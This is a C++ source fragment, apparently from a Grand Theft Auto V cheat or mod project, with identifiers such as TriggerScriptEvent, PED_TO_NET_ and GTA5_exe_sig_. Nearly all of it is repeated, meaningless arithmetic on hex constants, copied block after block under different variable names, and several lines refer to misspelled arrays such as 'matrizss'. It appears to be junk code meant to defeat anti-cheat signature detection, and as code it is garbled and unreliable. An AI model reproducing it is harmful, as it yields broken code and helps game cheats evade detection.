				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "PosZ");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
